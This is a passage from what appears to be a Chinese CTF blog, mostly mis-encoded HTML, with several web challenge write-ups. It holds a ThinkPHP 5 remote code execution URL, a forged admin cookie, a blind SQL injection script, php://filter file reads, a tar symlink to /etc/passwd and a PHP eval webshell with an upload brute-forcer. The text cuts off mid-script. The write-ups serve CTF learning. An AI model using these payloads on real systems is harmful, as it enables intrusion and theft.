class="string">'zhinianyuxin\n'</span></span><br><span class="line">form = &#123;</span><br><span class="line"><span class="string">'order_id'</span>: <span class="string">'119'</span>,</span><br><span class="line"><span class="string">'buyer_id'</span>: <span class="string">'16'</span>,  </span><br><span class="line"><span class="string">'good_id'</span>: <span class="string">'38'</span>,   </span><br><span class="line"><span class="string">'buyer_point'</span>: <span class="string">'200'</span>,</span><br><span class="line"><span class="string">'good_price'</span>: <span class="string">'50'</span>,</span><br><span class="line"><span class="string">'order_create_time'</span>: <span class="string">'1544796662.686132'</span></span><br><span class="line">&#125;</span><br><span class="line">str2sign = RANDOM_SECRET_KEY_FOR_PAYMENT_SIGNATURE + <span class="string">'&amp;'</span>.join([<span class="string">f'<span class="subst">&#123;i&#125;</span>=<span class="subst">&#123;form[i]&#125;</span>'</span> <span class="keyword">for</span> i <span class="keyword">in</span> form])</span><br><span class="line">str2sign3= str2sign.encode(<span class="string">'utf-8'</span>)</span><br><span class="line">sign = md5(str2sign3).hexdigest()</span><br><span class="line">print(sign)</span><br></pre></td></tr></table></figure><p>å‘åŒ…æ„é€ ä¸€ä¸‹å¾—åˆ°flag,æ³¨æ„çº¢è‰²çš„åœ°æ–¹ä¹Ÿè¦åšç›¸åº”çš„ä¿®æ”¹ï¼Œå‘åŒ…å¾—åˆ°flag</p><p><a href="https://imgchr.com/i/FaNoKx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNoKx.png" alt="FaNoKx.png"></a></p><p><a href="https://imgchr.com/i/FaNjGd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaNjGd.png" alt="FaNjGd.png"></a></p><h3 id="tp5"><a href="#tp5" class="headerlink" title="tp5"></a>tp5</h3><p>è¿™ä¸ªé¢˜ç›®å°±æ˜¯æœ€è¿‘å‡ å¤©åˆšçˆ†å‡ºæ¥çš„tp5è¿œç¨‹getshellçš„æ¼æ´ï¼Œç›´æ¥ä¸Šç½‘æœpayloadï¼Œå‚è€ƒäº†è¿™ç¯‡æ–‡ç« :<a href="https://mp.weixin.qq.com/s/NQAZPz8uT8eNFyeMT4l8Ig" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/NQAZPz8uT8eNFyeMT4l8Ig</a></p><p>æˆ‘ç”¨çš„æ˜¯ä¸‹é¢çš„payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami</span><br></pre></td></tr></table></figure><p>æœ€åè·å–flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.219.61.234:10005/public/index.php?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=cat%20/flag</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/FaBebt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FaBebt.png" alt="FaBebt.png"></a></p><h3 id="secret-system"><a href="#secret-system" class="headerlink" title="secret-system"></a>secret-system</h3><p>ä¸€è¿›å»ä¹‹åä¼šå‘ç°loginåŠŸèƒ½æ²¡ååº”ï¼Œè€Œuploadé¡µé¢ä¹Ÿéœ€è¦ç®¡ç†å‘˜æƒé™ï¼Œè‚¯å®šæ˜¯è¦ä¼ªé€ è‡ªå·±æ˜¯ç®¡ç†å‘˜çš„èº«ä»½ç„¶åå»æŒ–æ˜æ–‡ä»¶ä¸Šä¼ çš„æ¼æ´ï¼ŒæŸ¥çœ‹æºä»£ç æ— æœåé¡ºæ‰‹çœ‹çœ‹<code>robots.txt</code>,å‘ç°é‡Œé¢æœ‰ç™»å½•çš„åœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: index.php?r=site/loginuser_1</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥è¿›å»ç™»é™†çš„é¡µé¢ï¼Œå†æ¬¡æŸ¥çœ‹æºä»£ç å‘ç°ä½œè€…çš„ä¿¡æ¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">*** author: cib_zhinianyuxin.com</span><br><span class="line">*** code: github.com</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>é¡ºæ‰‹å»æŸ¥ä¸€ä¸‹,å‘ç°å¯ä»¥ç”¨<code>test/cib_sec</code>ç™»å½•ä½†ä¸æ˜¯<code>admin</code>ï¼Œè€Œä¸”æ³„éœ²çš„ä»£ç é‡Œé¢è¯´æ˜äº†å¯ä»¥ä¼ªé€ cookieï¼Œcookieåç§°æ˜¯Cib_securityï¼Œæ˜¯ä¸€æ®µç»è¿‡åºåˆ—åŒ–çš„ä¸œè¥¿ï¼Œåˆ°æ—¶å€™å°±å¯ä»¥ä¼ªé€ äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">##README.md</span><br><span class="line"></span><br><span class="line">    *** author: cib_zhinianyuxin.com</span><br><span class="line"></span><br><span class="line">It&apos;s just a system which is not completed , there are some tips:</span><br><span class="line"></span><br><span class="line">    you can use test/cib_sec to login ,but you are not admin!</span><br><span class="line">    only admin can upload file ,but whichone can not bypass my rules.</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">$sign = array(</span><br><span class="line">                    &apos;id&apos;=&gt;$model-&gt;id,</span><br><span class="line">                    &apos;name&apos;=&gt;$model-&gt;username,</span><br><span class="line">                    &apos;sign&apos;=&gt;md5($model-&gt;id.$model-&gt;username),</span><br><span class="line">                );</span><br><span class="line">$_COOKIE[&apos;Cib_security&apos;] = serialize($sign);</span><br><span class="line">**/</span><br></pre></td></tr></table></figure><p>ä»¥testèº«ä»½ç™»å½•åæŠŠcookieæ‹¿å‡ºæ¥ç„¶åè§£ç </p><p><a href="https://imgchr.com/i/FadGK1" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FadGK1.md.png" alt="FadGK1.md.png"></a></p><p>ç„¶åæŠŠé‡Œé¢çš„MD5è§£ä¸€ä¸‹å‘ç°æ˜¯<code>2test</code>,é‚£æˆ‘ä»¬å°±æ„é€ ä¸€ä¸ª<code>1admin</code>ï¼Œæ„é€ å¦‚ä¸‹çš„åºåˆ—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:3&#123;s:2:&quot;id&quot;;i:1;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:4:&quot;sign&quot;;s:32:&quot;6c5de1b510e8bdd0bc40eff99dcd03f8&quot;;&#125;</span><br></pre></td></tr></table></figure><p>å†æ¬¡ç»è¿‡URLç¼–ç ç„¶åä¿å­˜ä¸€ä¸‹cookieå°±å¯ä»¥ä»¥adminèº«ä»½ç™»å½•ï¼Œæ¥ä¸Šæ¥å°±æ˜¯æ–‡ä»¶ä¸Šä¼ çš„éƒ¨åˆ†äº†ï¼Œè¿™é‡Œçš„æ–‡ä»¶ä¸Šä¼ å°±æ˜¯ä¸ªå¾ˆç®€å•çš„åç¼€åç»•è¿‡ï¼Œæˆ‘è¯•äº†è´¼ä¹…ï¼Œè¿™ä¸ªåç¼€åæœ‰ç‚¹åï¼Œç”¨çš„<code>pht</code>,ç„¶åå‘åŒ…ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œèœåˆ€é“¾æ¥ï¼ŒæˆåŠŸè·å–flag</p><p><a href="https://imgchr.com/i/FawmQA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/12/15/FawmQA.png" alt="FawmQA.png"></a></p><h3 id="shell"><a href="#shell" class="headerlink" title="shell?"></a>shell?</h3><p>è¿™ä¸ªé¢˜ç›®ç¡®å®æ‹“å®½äº†æ–°æ€è·¯ï¼Œåšäº†å¥½ä¹…æ‰åšå‡ºæ¥ç”±äºç‰¹æ®ŠåŸå› å‘¢ï¼Œå°±ä¸å‘è¯¦ç»†writeupäº†ã€‚ã€‚ã€‚ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>è¿™ä¸€æ¬¡æŠŠwebç»™akäº†ï¼ŒçœŸæ˜¯èˆ’æœå‘23333ï¼Œæˆªä¸ªå›¾ç•™å¿µä¸€ä¸‹</p><p><img src="https://s1.ax1x.com/2018/12/16/Fd5Lpd.png" alt="Fd5Lpd.png"></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>å®‰æ’11æœˆèµ›Webé¢˜ç›®å¤ç°</title>
      <link href="/anheng-11month.html"/>
      <url>/anheng-11month.html</url>
      <content type="html"><![CDATA[<p>è€ƒå®Œç½‘ç»œå®‰å…¨è·Ÿç®—æ³•å°±èµ¶ç´§æ¥å¤ç°ä¸€ä¸‹é¢˜ç›®ï¼Œåˆå­¦åˆ°äº†ä¸€æ³¢çŸ¥è¯†äº†<a id="more"></a>23333ï¼Œè¿™æ¬¡é¢˜ç›®çš„è´¨é‡è´¼å¥½</p><h3 id="æ‰‹é€Ÿè¦å¿«"><a href="#æ‰‹é€Ÿè¦å¿«" class="headerlink" title="æ‰‹é€Ÿè¦å¿«"></a>æ‰‹é€Ÿè¦å¿«</h3><p>ä¸Šä¸€ä¸ªæœˆçš„åŸé¢˜ï¼Œä¸å¤šè¯´ï¼Œç›´æ¥åœ¨httpå¤´é‡Œé¢æ‰¾åˆ°å¯¹åº”çš„passwordç™»é™†ä»¥åç›´æ¥å°±æ˜¯å…³äºé¡µé¢ä¸Šä¼ çš„åŠŸèƒ½ï¼Œè¿™é‡Œçš„ä¸Šä¼ æ˜¯æœåŠ¡å™¨ç«¯çš„é—®é¢˜<br>ç›´æ¥ä¸Šä¼ ä¸€ä¸ªé<code>php</code>ç»“å°¾çš„æ–‡ä»¶å³å¯è§£æ<br><a href="https://imgchr.com/i/FmMnPS" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmMnPS.md.png" alt="FmMnPS.md.png"></a><br>ç„¶åå¯ä»¥ç›´æ¥è¾“å…¥ç›¸å…³å‘½ä»¤è·å–flagä¸å¤šè¯´<br><img src="https://s1.ax1x.com/2018/11/30/FmMMvj.png" alt="FmMMvj.png"></p><p><a href="https://imgchr.com/i/FmM1rn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmM1rn.md.png" alt="FmM1rn.md.png"></a></p><h3 id="å¥½é»‘çš„é»‘åå•"><a href="#å¥½é»‘çš„é»‘åå•" class="headerlink" title="å¥½é»‘çš„é»‘åå•"></a>å¥½é»‘çš„é»‘åå•</h3><p>è¿™ä¸ªé¢˜ç›®è´¨é‡å¾ˆå¥½ï¼Œè‡³å°‘æˆ‘ä»¥å‰éƒ½æ²¡è§è¿‡è¿™ç§ç›²æ³¨ï¼Œé‡Œé¢åˆ©ç”¨äº†betweençš„å‡ ä¸ªç‰¹æ€§ï¼Œåˆå­¦åˆ°äº†2333<br>å³é”®æŸ¥çœ‹æºä»£ç å°±ä¼šå‘ç°å¾ˆæ˜æ˜¾çš„<code>id</code>å‚æ•°ï¼Œè¿™é‡Œçš„æ€è·¯å°±æ˜¯<code>SQLæ³¨å…¥</code><br><img src="https://s1.ax1x.com/2018/11/30/FmM3bq.png" alt="FmM3bq.png"><br>å°è¯•å¯¹å…¶è¿›è¡Œæ³¨å…¥ï¼Œå‘ç°å…¶æ˜æ˜¾æ˜¯å­˜åœ¨è¿‡æ»¤çš„ï¼Œä¸€æ—¦é‡åˆ°å…³é”®å­—å°±ä¼šè¿”å›<code>è¿™ä¹ˆåï¼Ÿæƒ³è®©æˆ‘ä¸‹é¢ç»™ä½ åƒå—ï¼ŸXD</code>çš„å­—æ ·<br>å¦‚æœæŸ¥è¯¢ä¸åˆ°çš„è¯å°±ä¼šè¿”å›<code>æƒ³è®©æˆ‘ä¸‹é¢ç»™ä½ åƒï¼Ÿ</code><br>fuzzä¸€ä¸‹å¤§æ¦‚å‘ç°è¿‡æ»¤çš„ä¸œè¥¿æœ‰<code>ç©ºæ ¼ï¼Œ*ï¼Œunionï¼Œå•å¼•å·</code>ç­‰ç­‰ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±ä¸å¯ä»¥ç”¨å†…è”çš„æ³¨å…¥ï¼Œè¿™é‡Œç©ºæ ¼æˆ‘ä»¬å¯ä»¥ç”¨<code>%0a</code>å»ç»•è¿‡ï¼Œæµ‹è¯•ä¸€ä¸‹<br><a href="https://imgchr.com/i/FmQ9oV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQ9oV.md.png" alt="FmQ9oV.md.png"></a><br>ä¸‹é¢å°±æ˜¯è¿™æ¬¡ç›²æ³¨çš„é‡ç‚¹çŸ¥è¯†åˆ©ç”¨<code>between and</code><br><img src="https://s1.ax1x.com/2018/11/30/FmQFWF.png" alt="FmQFWF.png"><br>ä¸Šé¢ä¸¤ä¸ªæ‰§è¡Œè¯­å¥å°±è§£é‡Šäº†ä¸ºä»€ä¹ˆå¯ä»¥è¿™æ ·åšï¼Œå½“selectçš„å€¼åœ¨betweenä¹‹é—´å°±ä¼šè¿”å›1ï¼Œè€Œä¸”å‰é¢é€‰æ‹©å‡ºæ¥çš„è¯è¯­ä¼šæŒ‰ç…§é¡ºåºåŒ¹é…ï¼Œç¬¬ä¸€ä¸ªåŒ¹é…æ­£ç¡®çš„è¯å°±ä¼šåŒ¹é…ç¬¬äºŒä¸ª<br><img src="https://s1.ax1x.com/2018/11/30/FmQkz4.png" alt="FmQkz4.png"><br>è€Œä¸”è¿˜å¯ä»¥å›ºå®šå¥½æœ€åä¸€ä½ï¼Œç„¶åå‰é¢ä¸€æ­¥æ­¥å»å­—æ¯ç»™æ‰¾å‡º<br><img src="https://s1.ax1x.com/2018/11/30/FmQVy9.png" alt="FmQVy9.png"><br>ä½†æ˜¯æŠŠæ•°æ®åº“è·‘å‡ºæ¥ä»¥ååé¢ç»§ç»­åŠ ä¸Šç©ºæ ¼è¿˜æ˜¯ä¼šæ˜¾ç¤º1ï¼Œè¿™åœ¨å†™è„šæœ¬çš„æ—¶å€™å¾—æ³¨æ„ä¸€ä¸‹ï¼Œè¿˜æœ‰å‡ ç‚¹å¾—æ³¨æ„ä¸‹ï¼Œå•å¼•å·è¿‡æ»¤æ‰å¯ä»¥ä½¿ç”¨16è¿›åˆ¶ï¼Œå¦å¤–<code>information_schema.tables</code>è¢«è¿‡æ»¤å¯ä»¥ä½¿ç”¨<code>information_schema%0a.tables</code>è¿™æ ·å»ç»•è¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">burl = <span class="string">'http://101.71.29.5:10008/show.php?id=-1'</span></span><br><span class="line"></span><br><span class="line">flag  = <span class="number">0</span></span><br><span class="line">ans  = <span class="string">''</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line"><span class="keyword">if</span> flag == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">127</span>,<span class="number">32</span>,<span class="number">-1</span>):</span><br><span class="line"><span class="keyword">if</span> j == <span class="number">33</span>:</span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="comment">#payload = '%0aor%0a(select%0adatabase()%0abetween%0a0x'+result+hex(j)[2:4]+'%0aand%0a0x7a)' #web</span></span><br><span class="line"><span class="comment">#payload  = '%0aor%0a(select%0a(select%0agroup_concat(table_name)%0afrom%0ainformation_schema%0a.tables%0awhere%0atable_schema%0abetween%0a0x776562%0aand%0a0x776562)%0abetween%0a0x'+result+hex(j)[2:4]+'%0aand%0a0x7a)'  #admin,flaggg,menu</span></span><br><span class="line"><span class="comment">#payload = '%0aor%0a(select%0a(select%0agroup_concat(column_name)%0afrom%0ainformation_schema%0a.columns%0awhere%0atable_name%0abetween%0a0x666c61676767%0aand%0a0x666c61676767)%0abetween%0a0x'+result+hex(j)[2:4]+'%0aand%0a0x7a)'  #id,f1agg</span></span><br><span class="line">payload = <span class="string">'%0aor%0a(select%0a(select%0af1agg%0afrom%0aflaggg)%0abetween%0a0x'</span>+result+hex(j)[<span class="number">2</span>:<span class="number">4</span>]+<span class="string">'%0aand%0a0x7a)'</span></span><br><span class="line">url = burl+ payload</span><br><span class="line">con  = requests.get(url)</span><br><span class="line"><span class="comment">#print(con.text)</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">u"éƒ‘å·"</span> <span class="keyword">in</span> con.text:</span><br><span class="line">ans = ans + chr(j)</span><br><span class="line">print(result)</span><br><span class="line">result = result + hex(j)[<span class="number">2</span>:<span class="number">4</span>]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(ans)</span><br></pre></td></tr></table></figure><p>æ„‰å¿«åœ°æ‹¿åˆ°flag<br><a href="https://imgchr.com/i/FmQndx" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQndx.md.png" alt="FmQndx.md.png"></a></p><h3 id="interesting-web"><a href="#interesting-web" class="headerlink" title="interesting web"></a>interesting web</h3><p>è¿™ä¸ªé¢˜ç›®ä¸Šæ¥å°±å‘ç°æœ‰æ³¨å†Œï¼Œç™»å½•ï¼Œæ‰¾å›å¯†ç çš„åŠŸèƒ½ï¼Œé€šå¸¸æˆ‘ä»¬éœ€è¦æ³¨å†Œçœ‹ä¸€ä¸‹<br>ç™»é™†ä¹‹åå‘ç°ä¸Šä¼ é¡µé¢ï¼Œä½†æ˜¯æ ¹æ®é¡µé¢ä¸€å¼€å§‹æç¤ºè¯´æ˜ç®¡ç†å‘˜æ‰å¯ä»¥ä¸Šä¼ <code>tar</code>åŒ…ï¼Œè¿™é‡Œå°±å®¹æ˜“æƒ³åˆ°è½¯è¿æ¥ï¼Œä½†æ˜¯é¦–å…ˆæˆ‘ä»¬å¾—ä»¥<code>admin</code>èº«ä»½ç™»å½•ï¼Œè¿™æ—¶å€™æ ¹æ®httpå¯ä»¥å‘ç°è¿™åº”è¯¥æ˜¯<code>flask</code>æ¡†æ¶å†™çš„web<br><img src="https://s1.ax1x.com/2018/11/30/FmQlWD.png" alt="FmQlWD.png"></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªç‚¹å°±æ˜¯<code>flask</code>æ¡†æ¶çš„<code>session</code>å¯ä»¥åœ¨æµè§ˆå™¨ç«¯æŸ¥çœ‹ï¼Œå¹¶ä¸”å¯ä»¥è¯»å–é‡Œé¢çš„<code>token</code>å€¼ï¼Œ<br><a href="https://imgchr.com/i/FmQGyd" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQGyd.md.png" alt="FmQGyd.md.png"></a><br>è¿™ä¸œè¥¿å¯ä»¥åˆ©ç”¨åœ¨æ‰¾å›å¯†ç çš„åŠŸèƒ½ä¸Šé¢<br><a href="https://imgchr.com/i/FmQJOA" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQJOA.md.png" alt="FmQJOA.md.png"></a><br>è¿™é‡Œé¢çš„tokenå€¼æˆ‘ä»¬å¯ä»¥ç”¨æ¥ç›´æ¥ä¿®æ”¹adminçš„å¯†ç ï¼Œè¿™ä¸œè¥¿æ°å¥½å°±æ˜¯ä¿®æ”¹å¯†ç éœ€è¦çš„ä¸œè¥¿<br>ç„¶åå†ä»¥adminèº«ä»½ç™»å½•ï¼Œä¸Šä¸€ä¸ªè½¯è¿æ¥çš„taråŒ…ï¼Œå…ˆæ„é€ ä¸€ä¸‹taråŒ…<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s /etc/passwd 2222222.jpg</span><br><span class="line">tar cvfp 233.tar 2222222.jpg</span><br></pre></td></tr></table></figure></p><p>ä¸Šä¼ åtaråŒ…è§£å‹ï¼Œç„¶åcurlä¸€ä¸‹è¯¥å›¾ç‰‡åœ°å€è·å–flag<br><a href="https://imgchr.com/i/FmQDSg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQDSg.md.png" alt="FmQDSg.md.png"></a></p><p><code>flag{5be43c58a33a867cb11975587f8edf33}</code></p><h3 id="image-up"><a href="#image-up" class="headerlink" title="image up"></a>image up</h3><p>ä¸€ä¸Šæ¥å°±æ˜¯ä¸ªç™»å½•é¡µé¢å…¶å®è¿™ä¸ªç™»å½•é¡µé¢æ²¡æœ‰ç”¨ï¼Œä½ éšä¾¿è¾“å¦‚éƒ½å¯ä»¥ç™»å½•åˆ°åå°ä¸Šä¼ é¡µé¢<br><a href="https://imgchr.com/i/FmQgwq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/11/30/FmQgwq.md.png" alt="FmQgwq.md.png"></a><br>å¯ä»¥çœ‹åˆ°urlï¼Œå¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œå°è¯•ä¸€ä¸‹è¯»å–æ–‡ä»¶ï¼Œå¯ä»¥è¯»åˆ°ä¸€ä¸‹indexä»¥åŠuploadé¡µé¢<br><code>http://101.71.29.5:10007/index.php?page=php://filter/read=convert.base64-encode/resource=index</code><br><code>http://101.71.29.5:10007/index.php?page=php://filter/read=convert.base64-encode/resource=upload</code></p><p> index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!stristr($_GET[<span class="string">'page'</span>], <span class="string">".."</span>)) &#123;</span><br><span class="line">    $page = $_GET[<span class="string">'page'</span>].<span class="string">".php"</span>;</span><br><span class="line">    <span class="keyword">include</span>($page);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    header(<span class="string">"Location: index.php?page=login"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  header(<span class="string">"Location: index.php?page=login"</span>);</span><br><span class="line">è¿™é‡Œçš„ä»£ç éªŒè¯ä¸éœ€è¦ä»»ä½•æ£€éªŒå°±å¯ä»¥ç™»å½•</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?</span> php $error = <span class="string">""</span>;</span><br><span class="line">$exts = <span class="keyword">array</span>(<span class="string">"jpg"</span>, <span class="string">"png"</span>, <span class="string">"gif"</span>, <span class="string">"jpeg"</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_FILES[<span class="string">"image"</span>])) &#123;</span><br><span class="line">  $temp = explode(<span class="string">"."</span>, $_FILES[<span class="string">"image"</span>][<span class="string">"name"</span>]);</span><br><span class="line">  $extension = end($temp);</span><br><span class="line">  <span class="keyword">if</span> ((@$_upfileS[<span class="string">"image"</span>][<span class="string">"size"</span>] &lt; <span class="number">102400</span>)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (in_array($extension, $exts)) &#123;</span><br><span class="line">      $path = <span class="string">"uploads/"</span>.md5($temp[<span class="number">0</span>].time()).<span class="string">"."</span>.$extension;</span><br><span class="line">      move_uploaded_file($_FILES[<span class="string">"image"</span>][<span class="string">"tmp_name"</span>], $path);</span><br><span class="line">      $error = <span class="string">"????????????!"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      $error = <span class="string">"???????????????"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $error = <span class="string">"??????????????????????????????"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>ä»æ–‡ä»¶ä¸Šä¼ çš„è€Œè¿™æ®µä»£ç ä¹Ÿå¾ˆå®¹æ˜“çœ‹ï¼Œå°±æ˜¯æ–‡ä»¶ååŠ ä¸Šæ—¶é—´æˆ³ç„¶åå†MD5æ‹¼æ¥æˆæ–°çš„æ–‡ä»¶åï¼Œè¿™ä¸¤ä¸ªä¸œè¥¿æˆ‘ä»¬å¯ä»¥è¿›è¡Œé¢„æµ‹<br>è‡ªå·±æœ¬åœ°æ–°å»ºä¸€ä¸ª<code>over.php</code><br>é‡Œé¢çš„å†…å®¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">phpinfo();</span><br><span class="line">  @<span class="keyword">eval</span>($_POST[<span class="string">'_'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æŠŠè¯¥æ–‡ä»¶å‹ç¼©ï¼Œç„¶åæ”¹åç¼€åä¸º.jpgçš„å›¾ç‰‡æ–‡ä»¶ï¼Œæ¥ç€å°±è¯¥é¢„æµ‹è·¯å¾„åå­—å¹¶ä½¿ç”¨ä¼ªåè®®<br>è¿™é‡Œå¾ˆå‘ï¼Œæœ‰ä¸ªæ—¶åŒºçš„é—®é¢˜åŠ ä¸Š<code>8*3600</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://101.71.29.5:10007/"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(str)</span>:</span></span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(str)</span><br><span class="line"><span class="keyword">return</span> m.hexdigest()</span><br><span class="line">files = &#123;</span><br><span class="line"><span class="string">"image"</span>:(<span class="string">"over123.jpg"</span>,open(<span class="string">"over.jpg"</span>,<span class="string">"rb"</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#print open("over.jpg","rb")</span></span><br><span class="line">t = int(time.time()+<span class="number">8</span>*<span class="number">3600</span>)</span><br><span class="line">requests.post(url=url+<span class="string">"upload.php"</span>,files=files)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(t<span class="number">-100</span>,t+<span class="number">150</span>):</span><br><span class="line">path = <span class="string">"uploads/"</span>+md5(<span class="string">"over123"</span>+str(i))+<span class="string">".jpg"</span></span><br><span class="line"><span class="comment">#print 'Waiting'</span></span><br><span class="line">status = requests.get(url=url+path).status_code</span><br><span class="line"><span 